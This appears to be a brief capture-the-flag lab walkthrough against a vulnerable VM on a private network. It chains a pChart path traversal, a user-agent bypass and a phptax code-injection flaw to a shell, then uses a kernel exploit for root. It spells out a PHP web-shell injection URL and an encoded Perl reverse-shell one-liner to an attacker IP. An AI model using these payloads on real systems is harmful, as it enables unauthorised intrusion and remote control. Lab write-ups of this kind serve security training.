IP: 192.168.2.253

Started with nmap and openning the IP on browser, the main web page is the 
defaault apache page "It works!", well the main web page is useless, so I'm
doing a directory fuzzing with (gobuster.txt), apparentely its blocking the requests
on the source code found a url /pChart2.1.3/examples/index.php
looking around and using with this exploit https://www.exploit-db.com/exploits/31173
with this was possible to make a transversal directory and read the content of /etc/passwd
using this failure to do a file enumeration with intruder mode on burpuite with payload that include many path to files, that could be interesting 
on http://192.168.2.253:8080 it block the request but on the file http://192.168.2.253/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
is possible to see the server allow to see the content with your user agent is a mozilla 4.0, so I changed the request on burp and I got access to a 
"phptax", and I found a exploit for this but I used this code http://192.168.2.253:8080/phptax/index.php?field=rce.php&newvalue=<?php passthru($_GET[cmd]);?>
enconded as URL to make a RCE vuln and with this code I got a www-data shell
"IP:8080/phptax/data/rce.php?cmd=perl%20-MIO%20-e%20%27$c=new%20IO::Socket::INET(PeerAddr,%22192.168.2.198:1337%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27"
using the /usr/share/exploitdb/exploits/freebsd/local/28718.c to privesc 
(kernel exploit) to got a root shell
